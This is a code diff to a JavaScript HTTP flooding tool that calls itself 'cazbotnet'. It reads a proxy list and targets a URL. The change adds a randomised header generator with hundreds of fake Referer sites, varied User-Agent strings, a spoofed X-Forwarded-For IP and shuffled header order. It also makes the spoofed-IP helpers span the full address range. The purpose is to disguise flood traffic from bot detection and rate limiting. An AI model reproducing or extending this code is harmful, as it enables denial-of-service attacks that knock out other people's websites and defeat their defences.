@@ -70,10 +70,10 @@ function getStatus() {
 
     Promise.race([requestPromise, timeoutPromise]).then(response => {
         const { status, data } = response;
-        const randomIP = `${Math.floor(Math.random() * 100)}.${Math.floor(Math.random() * 100)}.${Math.floor(Math.random() * 100)}.${Math.floor(Math.random() * 100)}`;
+        const randomIP = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
         console.log(`[cazbotnet] -> (${randomIP}) / ${getTitleFromHTML(data)} (${status})`);
     }).catch(error => {
-        const randomIP = `${Math.floor(Math.random() * 100)}.${Math.floor(Math.random() * 100)}.${Math.floor(Math.random() * 100)}.${Math.floor(Math.random() * 100)}`;
+        const randomIP = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
         
         if (error.message === "Request timed out") {
             console.log(`[cazbotnet] -> (${randomIP}) / Request Timed Out`);
@@ -97,70 +97,774 @@ function getTitleFromHTML(html) {
 }
 
 function randomHeaders() {
-  // ===== 1. Device-Specific Headers =====
-  const isApple = Math.random() > 0.5;
-  const isAndroid = !isApple;
-  
-  const deviceHeaders = {
-    ...(isApple && {
-      'x-apple-device-model': ['iPhone15,4', 'iPad13,8', 'MacBookPro18,3'][Math.floor(Math.random() * 3)],
-      'sec-ch-ua-platform': '"macOS"',
-      'x-apple-request-uuid': crypto.randomUUID()
-    }),
-    ...(isAndroid && {
-      'x-android-device': ['SM-G998U', 'Pixel 7 Pro', 'Xiaomi 13T'][Math.floor(Math.random() * 3)],
-      'sec-ch-ua-mobile': '?1',
-      'x-android-id': Math.random().toString(16).slice(2, 18)
-    })
-  };
+  const accepts = [
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*",
+    "text/html, application/xhtml+xml, image/jxr, */*",
+    "text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1"
+  ];
 
-  // ===== 2. Cloudflare Fingerprints =====
-  const cloudflareHeaders = {
-    'cf-ray': `${Math.random().toString(36).slice(2, 12)}-IST`,
-    'cf-connecting-ip': `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
-    'cf-ipcountry': ['US', 'DE', 'JP', 'BR', 'IN'][Math.floor(Math.random() * 5)],
-    'sec-ch-ua': isApple 
-      ? '"Not_A Brand";v="8", "Chromium";v="120", "Apple WebKit";v="604"' 
-      : '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'
-  };
+  const encodings = ["gzip, deflate, br", "gzip, compress, br", "gzip, deflate", "br;q=1.0, gzip;q=0.8, *;q=0.1", "gzip"]; 
 
-  // ===== 3. API Auth Patterns =====
-  const authMethods = {
-    // JWT (Bearer Token)
-    jwt: {
-      'authorization': `Bearer ${Math.random().toString(36).slice(2)}.${Math.random().toString(36).slice(2)}.${Math.random().toString(36).slice(2)}`
-    },
-    // API Key
-    apiKey: {
-      'x-api-key': `key_${Math.random().toString(36).slice(2, 22)}`
-    },
-    // OAuth
-    oauth: {
-      'authorization': `OAuth ${Math.random().toString(36).slice(2, 42)}`
+  const referers = [
+"https://www.google.com/",
+"https://www.bing.com/",
+"https://duckduckgo.com/",
+"https://www.youtube.com/",
+"https://www.facebook.com/",
+"https://google.com/",
+"https://facebook.com/",
+"https://youtube.com/",
+"https://baidu.com/",
+"https://yahoo.com/",
+"https://amazon.com/",
+"https://wikipedia.org/",
+"https://qq.com/",
+"https://twitter.com/",
+"https://slashdot.org/",
+"https://google.co.in/",
+"https://taobao.com/",
+"https://live.com/",
+"https://sina.com.cn/",
+"https://yahoo.co.jp/",
+"https://linkedin.com/",
+"https://weibo.com/",
+"https://ebay.com/",
+"https://google.co.jp/",
+"https://yandex.ru/",
+"https://bing.com/",
+"https://vk.com/",
+"https://hao123.com/",
+"https://google.de/",
+"https://instagram.com/",
+"https://t.co/",
+"https://msn.com/",
+"https://amazon.co.jp/",
+"https://tmall.com/",
+"https://google.co.uk/",
+"https://pinterest.com/",
+"https://ask.com/",
+"https://reddit.com/",
+"https://wordpress.com/",
+"https://mail.ru/",
+"https://google.fr/",
+"https://blogspot.com/",
+"https://paypal.com/",
+"https://onclickads.net/",
+"https://google.com.br/",
+"https://tumblr.com/",
+"https://apple.com/",
+"https://google.ru/",
+"https://aliexpress.com/",
+"https://sohu.com/",
+"https://microsoft.com/",
+"https://imgur.com/",
+"https://google.it/",
+"https://imdb.com/",
+"https://google.es/",
+"https://netflix.com/",
+"https://gmw.cn/",
+"https://amazon.de/",
+"https://fc2.com/",
+"https://360.cn/",
+"https://alibaba.com/",
+"https://go.com/",
+"https://stackoverflow.com/",
+"https://ok.ru/",
+"https://google.com.mx/",
+"https://google.ca/",
+"https://amazon.in/",
+"https://google.com.hk/",
+"https://tianya.cn/",
+"https://amazon.co.uk/",
+"https://craigslist.org/",
+"https://rakuten.co.jp/",
+"https://naver.com/",
+"https://blogger.com/",
+"https://diply.com/",
+"https://google.com.tr/",
+"https://xhamster.com/",
+"https://flipkart.com/",
+"https://espn.go.com/",
+"https://soso.com/",
+"https://outbrain.com/",
+"https://nicovideo.jp/",
+"https://google.co.id/",
+"https://cnn.com/",
+"https://xinhuanet.com/",
+"https://dropbox.com/",
+"https://google.co.kr/",
+"https://googleusercontent.com/",
+"https://github.com/",
+"https://bongacams.com/",
+"https://ebay.de/",
+"https://kat.cr/",
+"https://bbc.co.uk/",
+"https://google.pl/",
+"https://google.com.au/",
+"https://pixnet.net/",
+"https://tradeadexchange.com/",
+"https://popads.net/",
+"https://googleadservices.com/",
+"https://ebay.co.uk/",
+"https://dailymotion.com/",
+"https://sogou.com/",
+"https://adnetworkperformance.com/",
+"https://adobe.com/",
+"https://directrev.com/",
+"https://nytimes.com/",
+"https://jd.com/",
+"https://wikia.com/",
+"https://adcash.com/",
+"https://livedoor.jp/",
+"https://booking.com/",
+"https://163.com/",
+"https://bbc.com/",
+"https://alipay.com/",
+"https://coccoc.com/",
+"https://dailymail.co.uk/",
+"https://indiatimes.com/",
+"https://china.com/",
+"https://dmm.co.jp/",
+"https://china.com.cn/",
+"https://chase.com/",
+"https://xnxx.com/",
+"https://buzzfeed.com/",
+"https://google.com.sa/",
+"https://huffingtonpost.com/",
+"https://youku.com/",
+"https://google.com.eg/",
+"https://google.com.tw/",
+"https://terraclicks.com/",
+"https://uol.com.br/",
+"https://amazon.cn/",
+"https://snapdeal.com/",
+"https://office.com/",
+"https://google.com.ar/",
+"https://microsoftonline.com/",
+"https://walmart.com/",
+"https://ameblo.jp/",
+"https://amazon.fr/",
+"https://daum.net/",
+"https://amazonaws.com/",
+"https://blogspot.in/",
+"https://slideshare.net/",
+"https://etsy.com/",
+"https://twitch.tv/",
+"https://google.com.pk/",
+"https://whatsapp.com/",
+"https://bankofamerica.com/",
+"https://yelp.com/",
+"https://globo.com/",
+"https://theguardian.com/",
+"https://tudou.com/",
+"https://flickr.com/",
+"https://aol.com/",
+"https://stackexchange.com/",
+"https://chinadaily.com.cn/",
+"https://cnet.com/",
+"https://weather.com/",
+"https://indeed.com/",
+"https://ettoday.net/",
+"https://amazon.it/",
+"https://reimageplus.com/",
+"https://quora.com/",
+"https://redtube.com/",
+"https://soundcloud.com/",
+"https://detail.tmall.com/",
+"https://google.nl/",
+"https://forbes.com/",
+"https://douban.com/",
+"https://loading-delivery2.com/",
+"https://naver.jp/",
+"https://bp.blogspot.com/",
+"https://cntv.cn/",
+"https://cnzz.com/",
+"https://google.co.za/",
+"https://wellsfargo.com/",
+"https://google.co.ve/",
+"https://target.com/",
+"https://adf.ly/",
+"https://zillow.com/",
+"https://vice.com/",
+"https://google.gr/",
+"https://leboncoin.fr/",
+"https://kakaku.com/",
+"https://ikea.com/",
+"https://gmail.com/",
+"https://bestbuy.com/",
+"https://vimeo.com/",
+"https://avito.ru/",
+"https://godaddy.com/",
+"https://spaceshipads.com/",
+"https://goo.ne.jp/",
+"https://salesforce.com/",
+"https://about.com/",
+"https://tripadvisor.com/",
+"https://allegro.pl/",
+"https://livejournal.com/",
+"https://nih.gov/",
+"https://tubecup.com/",
+"https://adplxmd.com/",
+"https://foxnews.com/",
+"https://deviantart.com/",
+"https://files.wordpress.com/",
+"https://doublepimp.com/",
+"https://google.com.ua/",
+"https://washingtonpost.com/",
+"https://theladbible.com/",
+"https://w3schools.com/",
+"https://themeforest.net/",
+"https://feedly.com/",
+"https://wikihow.com/",
+"https://wordpress.org/",
+"https://office365.com/",
+"https://taboola.com/",
+"https://9gag.com/",
+"https://mozilla.org/",
+"https://akamaihd.net/",
+"https://zol.com.cn/",
+"https://hclips.com/",
+"https://mediafire.com/",
+"https://businessinsider.com/",
+"https://google.cn/",
+"https://onet.pl/",
+"https://comcast.net/",
+"https://gfycat.com/",
+"https://softonic.com/",
+"https://google.com.co/",
+"https://pixiv.net/",
+"https://google.co.th/",
+"https://zhihu.com/",
+"https://americanexpress.com/",
+"https://amazon.es/",
+"https://mystart.com/",
+"https://nfl.com/",
+"https://wix.com/",
+"https://steamcommunity.com/",
+"https://archive.org/",
+"https://usps.com/",
+"https://ups.com/",
+"https://google.com.sg/",
+"https://wikimedia.org/",
+"https://bilibili.com/",
+"https://homedepot.com/",
+"https://google.ro/",
+"https://secureserver.net/",
+"https://doorblog.jp/",
+"https://force.com/",
+"https://telegraph.co.uk/",
+"https://skype.com/",
+"https://detik.com/",
+"https://shutterstock.com/",
+"https://google.com.ng/",
+"https://ebay-kleinanzeigen.de/",
+"https://weebly.com/",
+"https://popcash.net/",
+"https://google.com.ph/",
+"https://addthis.com/",
+"https://steampowered.com/",
+"https://web.de/",
+"https://bitauto.com/",
+"https://blogspot.com.br/",
+"https://google.se/",
+"https://github.io/",
+"https://rambler.ru/",
+"https://avg.com/",
+"https://ndtv.com/",
+"https://hulu.com/",
+"https://gamer.com.tw/",
+"https://xywy.com/",
+"https://huanqiu.com/",
+"https://nametests.com/",
+"https://51.la/",
+"https://orange.fr/",
+"https://tlbb8.com/",
+"https://sourceforge.net/",
+"https://hdfcbank.com/",
+"https://livejasmin.com/",
+"https://espncricinfo.com/",
+"https://answers.com/",
+"https://hp.com/",
+"https://gmx.net/",
+"https://youm7.com/",
+"https://mailchimp.com/",
+"https://mercadolivre.com.br/",
+"https://speedtest.net/",
+"https://xfinity.com/",
+"https://ebay.in/",
+"https://webmd.com/",
+"https://ifeng.com/",
+"https://google.at/",
+"https://groupon.com/",
+"https://blogfa.com/",
+"https://wordreference.com/",
+"https://uptodown.com/",
+"https://xuite.net/",
+"https://media.tumblr.com/",
+"https://hootsuite.com/",
+"https://usatoday.com/",
+"https://google.pt/",
+"https://capitalone.com/",
+"https://stumbleupon.com/",
+"https://goodreads.com/",
+"https://wp.pl/",
+"https://people.com.cn/",
+"https://bet365.com/",
+"https://google.be/",
+"https://t-online.de/",
+"https://paytm.com/",
+"https://fedex.com/",
+"https://fbcdn.net/",
+"https://icicibank.com/",
+"https://blog.jp/",
+"https://google.com.pe/",
+"https://thesaurus.com/",
+"https://bloomberg.com/",
+"https://mashable.com/",
+"https://caijing.com.cn/",
+"https://bild.de/",
+"https://extratorrent.cc/",
+"https://warmportrait.com/",
+"https://dmm.com/",
+"https://pandora.com/",
+"https://putlocker.is/",
+"https://amazon.ca/",
+"https://spiegel.de/",
+"https://seznam.cz/",
+"https://google.ae/",
+"https://spotify.com/",
+"https://wsj.com/",
+"https://dell.com/",
+"https://ign.com/",
+"https://jabong.com/",
+"https://udn.com/",
+"https://2ch.net/",
+"https://macys.com/",
+"https://chaturbate.com/",
+"https://kaskus.co.id/",
+"https://att.com/",
+"https://engadget.com/",
+"https://accuweather.com/",
+"https://gameforge.com/",
+"https://varzesh3.com/",
+"https://watsons.tmall.com/",
+"https://life.com.tw/",
+"https://smzdm.com/",
+"https://badoo.com/",
+"https://google.ch/",
+"https://mama.cn/",
+"https://samsung.com/",
+"https://adidas.tmall.com/",
+"https://rutracker.org/",
+"https://1688.com/",
+"https://chaoshi.tmall.com/",
+"https://1905.com/",
+"https://gsmarena.com/",
+"https://google.az/",
+"https://youth.cn/",
+"https://onlinesbi.com/",
+"https://styletv.com.cn/",
+"https://abs-cbnnews.com/",
+"https://mega.nz/",
+"https://twimg.com/",
+"https://liveadexchanger.com/",
+"https://livedoor.biz/",
+"https://zendesk.com/",
+"https://trello.com/",
+"https://mlb.com/",
+"https://rediff.com/",
+"https://tistory.com/",
+"https://39.net/",
+"https://reference.com/",
+"https://google.cl/",
+"https://google.com.bd/",
+"https://google.cz/",
+"https://milliyet.com.tr/",
+"https://reuters.com/",
+"https://icloud.com/",
+"https://verizonwireless.com/",
+"https://haosou.com/",
+"https://liputan6.com/",
+"https://kohls.com/",
+"https://kickstarter.com/",
+"https://kouclo.com/",
+"https://sahibinden.com/",
+"https://shopclues.com/",
+"https://enet.com.cn/",
+"https://ebay.it/",
+"https://mydomainadvisor.com/",
+"https://iqiyi.com/",
+"https://sberbank.ru/",
+"https://impress.co.jp/",
+"https://eksisozluk.com/",
+"https://bleacherreport.com/",
+"https://slickdeals.net/",
+"https://yaolan.com/",
+"https://tube8.com/",
+"https://evernote.com/",
+"https://trackingclick.net/",
+"https://babytree.com/",
+"https://baike.com/",
+"https://lady8844.com/",
+"https://infusionsoft.com/",
+"https://hurriyet.com.tr/",
+"https://ask.fm/",
+"https://google.hu/",
+"https://liveinternet.ru/",
+"https://flirchi.com/",
+"https://newegg.com/",
+"https://ijreview.com/",
+"https://torrentz.eu/",
+"https://vid.me/",
+"https://likes.com/",
+"https://kinopoisk.ru/",
+"https://thefreedictionary.com/",
+"https://youradexchange.com/",
+"https://pinimg.com/",
+"https://oracle.com/",
+"https://ppomppu.co.kr/",
+"https://google.ie/",
+"https://gap.com/",
+"https://4shared.com/",
+"https://rt.com/",
+"https://google.co.il/",
+"https://yandex.ua/",
+"https://scribd.com/",
+"https://ebay.com.au/",
+"https://quikr.com/",
+"https://photobucket.com/",
+"https://ltn.com.tw/",
+"https://taleo.net/",
+"https://repubblica.it/",
+"https://ce.cn/",
+"https://libero.it/",
+"https://onedio.com/",
+"https://list-manage.com/",
+"https://uploaded.net/",
+"https://slack.com/",
+"https://blogspot.com.es/",
+"https://blogimg.jp/",
+"https://livedoor.com/",
+"https://meetup.com/",
+"https://cbssports.com/",
+"https://retailmenot.com/",
+"https://goal.com/",
+"https://goodgamestudios.com/",
+"https://cnnic.cn/",
+"https://eastday.com/",
+"https://citi.com/",
+"https://lifehacker.com/",
+"https://51yes.com/",
+"https://exoclick.com/",
+"https://buzzfil.net/",
+"https://olx.in/",
+"https://hm.com/",
+"https://neobux.com/",
+"https://ameba.jp/",
+"https://cloudfront.net/",
+"https://teepr.com/",
+"https://pconline.com.cn/",
+"https://google.dz/",
+"https://kinogo.co/",
+"https://gizmodo.com/",
+"https://elpais.com/",
+"https://savefrom.net/",
+"https://rbc.ru/",
+"https://disqus.com/",
+"https://fiverr.com/",
+"https://theverge.com/",
+"https://ewt.cc/",
+"https://marca.com/",
+"https://xda-developers.com/",
+"https://lowes.com/",
+"https://free.fr/",
+"https://google.fi/",
+"https://allrecipes.com/",
+"https://xe.com/",
+"https://battle.net/",
+"https://torrentz.in/",
+"https://kompas.com/",
+"https://surveymonkey.com/",
+"https://aparat.com/",
+"https://souq.com/",
+"https://ilividnewtab.com/",
+"https://mobile.de/",
+"https://nordstrom.com/",
+"https://stockstar.com/",
+"https://nyaa.se/",
+"https://time.com/",
+"https://asos.com/",
+"https://intuit.com/",
+"https://youboy.com/",
+"https://nbcnews.com/",
+"https://naukri.com/",
+"https://4dsply.com/",
+"https://epweike.com/",
+"https://streamcloud.eu/",
+"https://techcrunch.com/",
+"https://medium.com/",
+"https://tabelog.com/",
+"https://independent.co.uk/",
+"https://chip.de/",
+"https://zippyshare.com/",
+"https://lenovo.com/",
+"https://expedia.com/",
+"https://wunderground.com/",
+"https://java.com/",
+"https://corriere.it/",
+"https://gmarket.co.kr/",
+"https://subscene.com/",
+"https://webssearches.com/",
+"https://plarium.com/",
+"https://hotels.com/",
+"https://autohome.com.cn/",
+"https://playstation.com/",
+"https://irctc.co.in/",
+"https://glassdoor.com/",
+"https://eyny.com/",
+"https://ancestry.com/",
+"https://gamefaqs.com/",
+"https://sabq.org/",
+"https://qunar.com/",
+"https://myway.com/",
+"https://google.sk/",
+"https://cnbeta.com/",
+"https://urdupoint.com/",
+"https://17ok.com/",
+"https://albawabhnews.com/",
+"https://youtube-mp3.org/",
+"https://blackboard.com/",
+"https://airbnb.com/",
+"https://google.com.vn/",
+"https://hatena.ne.jp/",
+"https://azlyrics.com/",
+"https://mercadolibre.com.ar/",
+"https://nifty.com/",
+"https://ero-advertising.com/",
+"https://kijiji.ca/",
+"https://doubleclick.net/",
+"https://justdial.com/",
+"https://6pm.com/",
+"https://mercadolibre.com.ve/",
+"https://shopify.com/",
+"https://olx.pl/",
+"https://instructables.com/",
+"https://bestadbid.com/",
+"https://realtor.com/",
+"https://chinaz.com/",
+"https://costco.com/",
+"https://nike.com/",
+"https://people.com/",
+"https://npr.org/",
+"https://timeanddate.com/",
+"https://gmanetwork.com/",
+"https://issuu.com/",
+"https://digikala.com/",
+"https://lenta.ru/",
+"https://kayak.com/",
+"https://jimdo.com/",
+"https://subito.it/",
+"https://beeg.com/",
+"https://codecanyon.net/",
+"https://box.com/",
+"https://rottentomatoes.com/",
+"https://kooora.com/",
+"https://vcommission.com/",
+"https://seesaa.net/",
+"https://verizon.com/",
+"https://siteadvisor.com/",
+"https://discovercard.com/",
+"https://blogspot.jp/",
+"https://elmundo.es/",
+"https://xunlei.com/",
+"https://11st.co.kr/",
+"https://tmz.com/",
+"https://douyutv.com/",
+"https://donga.com/",
+"https://google.no/",
+"https://taringa.net/",
+"https://haber7.com/",
+"https://youdao.com/",
+"https://okcupid.com/",
+"https://bukalapak.com/",
+"https://clien.net/",
+"https://thepiratebay.la/",
+"https://microsoftstore.com/",
+"https://gazeta.pl/",
+"https://bhaskar.com/",
+"https://all2lnk.com/",
+"https://mirror.co.uk/",
+"https://hupu.com/",
+"https://sh.st/",
+"https://k618.cn/",
+"https://instructure.com/",
+"https://so-net.ne.jp/",
+"https://ebay.fr/",
+"https://zomato.com/",
+"https://squarespace.com/",
+"https://urbandictionary.com/",
+"https://focus.de/",
+"https://google.dk/",
+"https://zulily.com/",
+"https://wired.com/",
+"https://overstock.com/",
+"https://wetransfer.com/",
+"https://itmedia.co.jp/",
+"https://southwest.com/",
+"https://latimes.com/",
+"https://fidelity.com/",
+"https://b5m.com/",
+"https://list.tmall.com/",
+"https://csdn.net/",
+"https://nba.com/",
+"https://change.org/",
+"https://sakura.ne.jp/",
+"https://gearbest.com/",
+"https://drudgereport.com/",
+"https://freepik.com/",
+"https://moneycontrol.com/",
+"https://eonline.com/",
+"https://livescore.com/",
+"https://google.com.my/",
+"https://asana.com/",
+"https://vnexpress.net/",
+"https://airtel.in/",
+"https://duckduckgo.com/",
+"https://agoda.com/",
+"https://japanpost.jp/",
+"https://yandex.com.tr/",
+"https://r10.net/",
+"https://cookpad.com/",
+"https://yodobashi.com/",
+"https://rdsa2012.com/",
+"https://mixi.jp/",
+"https://unblocked.la/",
+"https://woot.com/",
+"https://ytimg.com/",
+"https://php.net/",
+"https://pof.com/",
+"https://makemytrip.com/",
+"https://udemy.com/",
+"https://wayfair.com/",
+"https://domaintools.com/",
+"https://statcounter.com/",
+"https://hespress.com/",
+"https://trulia.com/",
+"https://slate.com/",
+"https://asus.com/",
+"https://billdesk.com/",
+"https://sears.com/",
+"https://aweber.com/",
+"https://musicboxnewtab.com/",
+"https://wow.com/",
+"https://foodnetwork.com/",
+"https://pch.com/",
+"https://yts.to/",
+"https://ca.gov/",
+"https://constantcontact.com/",
+"https://bomb01.com/",
+"https://yandex.kz/",
+"https://blogspot.mx/",
+"https://researchgate.net/",
+"https://mihanblog.com/",
+"https://interia.pl/",
+"https://goo.gl/",
+"https://ensonhaber.com/"
+  ];
+
+  const userAgents = [
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
+  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+  "POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1",
+  "POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1",
+  "portalmmm/2.0 N410i(c20;TB) ",
+  "Python-urllib/2.5",
+  "SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3",
+  "SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
+  "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)",
+  "SearchExpress",
+  "SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)",
+  "SEC-SGHX210/1.0 UP.Link/6.3.1.13.0",
+  "SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+  "SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0",
+  "SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+  "SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+  "SonyEricssonK750i/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+  "SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
+  "SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+  "SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+  "SonyEricssonT100/R101",
+  "Opera/9.80 (Macintosh; Intel Mac OS X 10.4.11; U; en) Presto/2.7.62 Version/11.00",
+  "Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00",
+  "Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10",
+  "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01",
+  "Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10",
+  "Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30",
+  "SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0",
+  "SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+  "SonyEricssonT68/R201A",
+  "SonyEricssonW580i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+  "SonyEricssonW660i/R6AD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+  "SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
+  "SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+  "SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]",
+  "SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
+  "SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
+  "BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102",
+  "BlackBerry9530/4.7.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 UP.Link/6.3.1.20.0",
+  "BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123",
+  "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)",
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0",
+  "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.7"
+
+  ];
+
+  // Helper: Generate random IP
+  const randomIp = () => 
+    Array.from({ length: 4 }, () => Math.floor(Math.random() * 255)).join('.');
+
+  // Helper: Shuffle object keys
+  const shuffleKeys = (obj) => {
+    const keys = Object.keys(obj);
+    for (let i = keys.length - 1; i > 0; i--) {
+      const j = Math.floor(Math.random() * (i + 1));
+      [keys[i], keys[j]] = [keys[j], keys[i]];
     }
+    return keys.reduce((newObj, key) => ({ ...newObj, [key]: obj[key] }), {});
   };
-  const selectedAuth = ['jwt', 'apiKey', 'oauth'][Math.floor(Math.random() * 3)];
 
-  // ===== Combine All Headers =====
-  return {
-    // Core Headers
-    'user-agent': isApple
-      ? 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
-      : 'Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
-    'accept': 'application/json, text/plain, */*',
-    'accept-language': 'en-US,en;q=0.9',
-
-    // Dynamic Sections
-    ...deviceHeaders,
-    ...cloudflareHeaders,
-    ...authMethods[selectedAuth],
-
-    // Security Headers (Always Present)
-    'x-frame-options': 'DENY',
-    'x-xss-protection': '1; mode=block',
-    'content-security-policy': "default-src 'self'"
+  // Main function: Generate a random header
+  const getHeader = () => {
+    const header = {
+      'Accept': accepts[Math.floor(Math.random() * accepts.length)],
+      'Accept-Encoding': encodings[Math.floor(Math.random() * encodings.length)],
+      'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
+      'Referer': referers[Math.floor(Math.random() * referers.length)],
+      'Dnt': Math.random() > 0.5 ? '0' : '1',
+      'Connection': 'keep-alive',
+      'X-Forwarded-For': randomIp(),
+      'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
+      'Upgrade-Insecure-Requests': '1'
+    };
+    return shuffleKeys(header);
   };
+
+  return { getHeader };
 }
+
 
 function randomIntn(min, max) {
   return Math.floor(Math.random() * (max - min) + min);
@@ -197,13 +901,11 @@ function randomElement(elements) {
   return elements[randomIntn(0, elements.length)];
 } 
 
-
 const ip_spoof2 = () => {
-    const getRandomByte = () => {
-        return Math.floor(Math.random() * 100) + '.' + Math.floor(Math.random() * 100) + '.' + Math.floor(Math.random() * 100) + '.' + Math.floor(Math.random() * 100);
-    };
-    return `${getRandomByte()}`;
+  const getRandomByte = () => Math.floor(Math.random() * 256); // 0-255
+  return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
 };
+
 const spoofed2 = ip_spoof2();
 
 const args = {
@@ -5839,6 +6541,7 @@ var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_he
 var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
 var proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/);
 const parsedTarget = url.parse(args.target);
+
 class NetSocket {
   constructor() {}
 
